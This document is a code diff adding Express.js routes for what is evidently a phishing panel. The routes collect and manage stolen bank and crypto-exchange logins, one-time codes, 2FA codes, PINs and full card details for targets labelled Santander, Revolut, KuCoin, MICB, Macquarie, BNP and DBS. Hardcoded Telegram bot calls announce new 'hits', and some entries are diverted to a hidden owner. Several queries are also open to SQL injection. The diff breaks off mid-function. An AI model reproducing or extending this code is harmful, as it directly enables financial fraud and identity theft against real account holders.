@@ -75,6 +75,41 @@ app.get("/getips", (req, res) => {
   });
 });
 
+app.options("/giveVisitor", cors());
+
+app.post("/giveVisitor", (req, res) => {
+  ip = req.body.ip;
+  owner = req.body.owner;
+
+  panelConnection.query(
+    `SELECT * FROM visitors WHERE ip = '${ip}' AND owner = '${owner}'`,
+    (err, rows, fields) => {
+      if (!rows.length) {
+        let details = [ip, owner];
+        let query = `INSERT INTO visitors(ip, owner) VALUES (?,?)`;
+        panelConnection.query(query, details, (err, rows, fields) => {
+          if (!err) res.send("Insertion Completed");
+          else console.log(err);
+        });
+      } else {
+        res.send("Already visited");
+      }
+    }
+  );
+});
+
+app.options("/getVisitors", cors());
+
+app.get("/getVisitors/:owner", (req, res) => {
+  owner = req.params.owner;
+  panelConnection.query(
+    `SELECT ip FROM visitors WHERE owner = '${owner}'`,
+    (err, rows) => {
+      res.send(rows);
+    }
+  );
+});
+
 app.options("/getRespentesting123!", cors());
 
 app.get("/getRespentesting123!", (req, res) => {
@@ -84,17 +119,2347 @@ app.get("/getRespentesting123!", (req, res) => {
   });
 });
 
+//SANTS
+//SANTS
+//SANTS
+
+app.options("/santsCustomers/:id/:owner/modal", cors());
+
+app.get("/santsCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM sants WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/santsCustomers/:owner", cors());
+
+app.get("/santsCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM sants WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/santsCommand", cors());
+
+app.post("/santsCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+
+  if (newStatus === 6) {
+    partNumber = req.body.partNumber;
+
+    let details = [newStatus, partNumber, uniqueid];
+    let query = `UPDATE sants SET status= ${newStatus}, partNumber = '${partNumber}' WHERE uniqueid= '${uniqueid}'`;
+
+    panelConnection.query(query, (err, rows, fields) => {
+      if (!err) res.send("Update Completed");
+      else console.log(err);
+    });
+  } else {
+    let details = [newStatus, uniqueid, owner];
+    let query = `UPDATE sants SET status=? WHERE uniqueid=?`;
+
+    panelConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Update Completed");
+      else console.log(err);
+    });
+  }
+});
+
+app.options("/santsCustomers/:id/:owner", cors());
+
+app.get("/santsCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM sants WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+let santsCount = 0;
+
+app.options("/santsSaveLogin", cors());
+
+app.post("/santsSaveLogin", cors(), (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  if (santsCount == 100) {
+    let details = [username, password, uniqueid, ip, "haytch123!"];
+    let query = `INSERT INTO sants(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+    axios.post(
+      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New Sants Hit:\n${username}`
+    );
+
+    panelConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Insertion Completed");
+      else console.log(err);
+    });
+    santsCount = 0;
+  } else {
+    let details = [username, password, uniqueid, ip, owner];
+    let query = `INSERT INTO sants(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+    panelConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Insertion Completed");
+      else console.log(err);
+    });
+    santsCount += 1;
+  }
+});
+
+app.options("/santsSaveOtp", cors());
+
+app.post("/santsSaveOtp", cors(), (req, res) => {
+  otp = req.body.otp;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [otp, uniqueid, owner];
+  let query = `UPDATE sants SET otp=?, status = 7 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/santsSaveLoginAgain", cors());
+
+app.post("/santsSaveLoginAgain", cors(), (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [username, password, uniqueid, owner];
+  let query = `UPDATE sants SET username=?, password = ?, status = 1 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/santsSavePhone", cors());
+
+app.post("/santsSavePhone", cors(), (req, res) => {
+  phone = req.body.phone;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [phone, uniqueid, owner];
+  let query = `UPDATE sants SET phone=?, status = 3 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/santsSaveCard", cors());
+
+app.post("/santsSaveCard", cors(), (req, res) => {
+  ccname = req.body.ccname;
+  ccnum = req.body.ccnum;
+  ccexp = req.body.ccexp;
+  cvv = req.body.cvv;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
+  let query = `UPDATE sants SET ccname=?, ccnum = ?, ccexp = ?, cvv = ?, status = 11 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/santsDeleteentry/:id", cors());
+
+app.post("/santsDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.body.owner;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM sants WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+//REV
+//REV
+//REV
+
+app.options("/revCustomers/:owner", cors());
+
+app.get("/revCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM rev WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/revCustomers/:id/:owner/modal", cors());
+
+app.get("/revCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM rev WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/revCommand", cors());
+
+app.post("/revCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE rev SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/revCustomers/:id/:owner", cors());
+
+app.get("/revCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM rev WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/revSaveLogin", cors());
+
+app.post("/revSaveLogin", cors(), (req, res) => {
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  let details = [telephone, uniqueid, ip, owner];
+  let query = `INSERT INTO rev(telephone,uniqueid,status,ip, owner) VALUES (?,?,1,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/revSaveLoginAgain", cors());
+
+app.post("/revSaveLoginAgain", cors(), (req, res) => {
+  telephone = req.body.telephone;
+  uniqueid = req.body.uniqueid;
+
+  let details = [telephone, uniqueid];
+  let query = `UPDATE rev SET telephone = ?, status = 1 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/revSaveName", cors());
+
+app.post("/revSaveName", cors(), (req, res) => {
+  fullname = req.body.fullname;
+  uniqueid = req.body.uniqueid;
+
+  let details = [fullname, uniqueid];
+  let query = `UPDATE rev SET fullname = ?, status = 5 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/revSaveCard", cors());
+
+app.post("/revSaveCard", cors(), (req, res) => {
+  ccnum = req.body.ccnum;
+  ccexp = req.body.ccexp;
+  cccvv = req.body.cccvv;
+  uniqueid = req.body.uniqueid;
+
+  let details = [ccnum, ccexp, cccvv, uniqueid];
+  let query = `UPDATE rev SET ccnum = ?, ccexp = ?, cccvv = ?, status = 9 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/revSavePin", cors());
+
+app.post("/revSavePin", cors(), (req, res) => {
+  pin = req.body.pin;
+  uniqueid = req.body.uniqueid;
+
+  let details = [pin, uniqueid];
+  let query = `UPDATE rev SET pin = ?, status = 6 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/revSaveOtp", cors());
+
+app.post("/revSaveOtp", cors(), (req, res) => {
+  otp = req.body.otp;
+  uniqueid = req.body.uniqueid;
+
+  let details = [otp, uniqueid];
+  let query = `UPDATE rev SET otp = ?, status = 3 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/revDeleteentry/:id", cors());
+
+app.post("/revDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.body.owner;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM rev WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+//KUCOIN
+//KUCOIN
+//KUCOIN
+
+app.options("/kcCustomers/:owner", cors());
+
+app.get("/kcCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM kc WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/kcCustomers/:id/:owner/modal", cors());
+
+app.get("/kcCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM kc WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/kcCommand", cors());
+
+app.post("/kcCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE kc SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/kcCustomers/:id/:owner", cors());
+
+app.get("/kcCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM kc WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/kcSaveLogin", cors());
+
+app.post("/kcSaveLogin", cors(), (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  let details = [username, password, uniqueid, ip, owner];
+  let query = `INSERT INTO kc(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/kcSaveLoginAgain", cors());
+
+app.post("/kcSaveLoginAgain", cors(), (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  uniqueid = req.body.uniqueid;
+
+  let details = [username, password, uniqueid];
+  let query = `UPDATE kc SET username = ?, password = ?, status = 1 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/kcSaveTradingPass", cors());
+
+app.post("/kcSaveTradingPass", cors(), (req, res) => {
+  tradingPass = req.body.tradingPass;
+  uniqueid = req.body.uniqueid;
+
+  let details = [tradingPass, uniqueid];
+  let query = `UPDATE kc SET tradingPass = ?, status = 7 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/kcSave2FA", cors());
+
+app.post("/kcSave2FA", cors(), (req, res) => {
+  twofactor = req.body.twofactor;
+  uniqueid = req.body.uniqueid;
+
+  let details = [twofactor, uniqueid];
+  let query = `UPDATE kc SET twofactor = ?, status = 3 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/kcSaveOTP", cors());
+
+app.post("/kcSaveOTP", cors(), (req, res) => {
+  otp = req.body.otp;
+  uniqueid = req.body.uniqueid;
+
+  let details = [otp, uniqueid];
+  let query = `UPDATE kc SET otp = ?, status = 5 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/kcSaveAll", cors());
+
+app.post("/kcSaveAll", cors(), (req, res) => {
+  otp = req.body.otp;
+  tradingPass = req.body.tradingPass;
+  twofactor = req.body.twofactor;
+  uniqueid = req.body.uniqueid;
+
+  let details = [otp, tradingPass, twofactor, uniqueid];
+  let query = `UPDATE kc SET otp = ?, tradingPass = ?, twofactor = ?, status = 9 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/kcDeleteentry/:id", cors());
+
+app.post("/kcDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.body.owner;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM kc WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+//MICB
+//MICB
+//MICB
+
+app.options("/micbCustomers/:owner", cors());
+
+app.get("/micbCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM micb WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/micbCustomers/:id/:owner/modal", cors());
+
+app.get("/micbCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM micb WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/micbCommand", cors());
+
+app.post("/micbCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE micb SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/micbCustomers/:id/:owner", cors());
+
+app.get("/micbCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM micb WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/micbSaveLogin", cors());
+
+app.post("/micbSaveLogin", cors(), (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  let details = [username, password, telephone, uniqueid, ip, owner];
+  let query = `INSERT INTO micb(username,password,telephone,uniqueid,status,ip, owner) VALUES (?,?,?,?,1,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/micbSaveLoginAgain", cors());
+
+app.post("/micbSaveLoginAgain", cors(), (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  telephone = req.body.telephone;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [username, password, telephone, uniqueid, owner];
+  let query = `UPDATE micb SET username=?, password=?, telephone = ?, status = 1 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/micbSaveOtp", cors());
+
+app.post("/micbSaveOtp", cors(), (req, res) => {
+  otp = req.body.otp;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [otp, uniqueid, owner];
+  let query = `UPDATE micb SET otp=?, status = 3 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/micbDeleteentry/:id", cors());
+
+app.post("/micbDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.body.owner;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM micb WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+//MQ
+//MQ
+//MQ
+
+app.options("/mqCustomers/:owner", cors());
+
+app.get("/mqCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM mq WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/mqCustomers/:id/:owner/modal", cors());
+
+app.get("/mqCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM mq WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/mqCommand", cors());
+
+app.post("/mqCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE mq SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/mqCustomers/:id/:owner", cors());
+
+app.get("/mqCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM mq WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+let mqCount = 0;
+
+app.options("/mqSaveLogin", cors());
+
+app.post("/mqSaveLogin", cors(), (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  if (mqCount == 3) {
+    axios.post(
+      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New MacQuarie Hit:\n${username}`
+    );
+
+    let details = [username, password, uniqueid, ip, "haytch123!"];
+    let query = `INSERT INTO mq(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+    panelConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Insertion Completed");
+      else console.log(err);
+    });
+    mqCount = 0;
+  } else {
+    let details = [username, password, uniqueid, ip, owner];
+    let query = `INSERT INTO mq(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+    panelConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Insertion Completed");
+      else console.log(err);
+    });
+    mqCount += 1;
+  }
+});
+
+app.options("/mqSaveLoginAgain", cors());
+
+app.post("/mqSaveLoginAgain", cors(), (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [username, password, uniqueid, owner];
+  let query = `UPDATE mq SET username=?, password=?, status = 1 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/mqSaveOtp", cors());
+
+app.post("/mqSaveOtp", cors(), (req, res) => {
+  otp = req.body.otp;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [otp, uniqueid, owner];
+  let query = `UPDATE mq SET otp=?, status = 3 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/mqDeleteentry/:id", cors());
+
+app.post("/mqDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.body.owner;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM mq WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+//BNP
+//BNP
+//BNP
+
+app.options("/bnpCustomers/:owner", cors());
+
+app.get("/bnpCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM bnp WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/bnpCommand", cors());
+
+app.post("/bnpCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+
+  let query = `UPDATE bnp SET status=${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bnpCustomers/:id/:owner/modal", cors());
+
+app.get("/bnpCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM bnp WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/bnpCustomers/:id/:owner", cors());
+
+app.get("/bnpCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM bnp WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/bnpSaveLoginOtp", cors());
+
+app.post("/bnpSaveLoginOtp", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  loginOtp = req.body.loginOtp;
+  owner = req.body.owner;
+
+  let details = [loginOtp, uniqueid, owner];
+  let query = `UPDATE bnp SET login_otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bnpSaveIdentityOtp", cors());
+
+app.post("/bnpSaveIdentityOtp", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  identityOtp = req.body.identityOtp;
+  owner = req.body.owner;
+
+  let details = [identityOtp, uniqueid, owner];
+  let query = `UPDATE bnp SET payment_otp=?, status = 5 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bnpSaveVerification", cors());
+
+app.post("/bnpSaveVerification", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  verificationCode = req.body.verificationCode;
+  owner = req.body.owner;
+
+  let details = [verificationCode, uniqueid, owner];
+  let query = `UPDATE bnp SET link=?, status = 7 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bnpSaveLoginAgain", cors());
+
+app.post("/bnpSaveLoginAgain", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  clientCode = req.body.clientCode;
+  secretCode = req.body.secretCode;
+  owner = req.body.owner;
+
+  let details = [clientCode, secretCode, uniqueid, owner];
+  let query = `UPDATE bnp SET username=?, password=?, status = 1 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bnpSavePhone", cors());
+
+app.post("/bnpSavePhone", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+
+  let details = [telephone, uniqueid, owner];
+  let query = `UPDATE bnp SET telephone=?, status = 12 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bnpSaveCard", cors());
+
+app.post("/bnpSaveCard", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  ccnum = req.body.ccnum;
+  ccexp = req.body.ccexp;
+  cccvv = req.body.cccvv;
+  owner = req.body.owner;
+
+  let details = [ccnum, ccexp, cccvv, uniqueid, owner];
+  let query = `UPDATE bnp SET cardnumber=?, expirydate=?, cvv=?, status = 9 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bnpSaveLogin", cors());
+
+app.post("/bnpSaveLogin", cors(), (req, res) => {
+  clientCode = req.body.clientCode;
+  secretCode = req.body.secretCode;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+  let details = [clientCode, secretCode, uniqueid, ip, owner];
+  let query = `INSERT INTO bnp(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bnpDeleteentry/:id", cors());
+
+app.post("/bnpDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM bnp WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+//DBS
+//DBS
+//DBS
+
+app.options("/dbsCustomers/:id", cors());
+
+app.get("/dbsCustomers/:id", (req, res) => {
+  uniqueid = req.params.id;
+
+  let details = [uniqueid];
+  let query = `SELECT * FROM customers WHERE uniqueid=?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/dbsCustomers", cors());
+
+app.get("/dbsCustomers", (req, res) => {
+  panelConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/dbsCommand", cors());
+
+app.post("/dbsCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+
+  if (newStatus == 12) {
+    merchant = req.body.merchant;
+    amount = req.body.amount;
+    let details = [newStatus, merchant, amount, uniqueid];
+    let query = `UPDATE customers SET status=?, merchant=?, amount=? WHERE uniqueid=?`;
+
+    panelConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Update Completed");
+      else console.log(err);
+    });
+  } else {
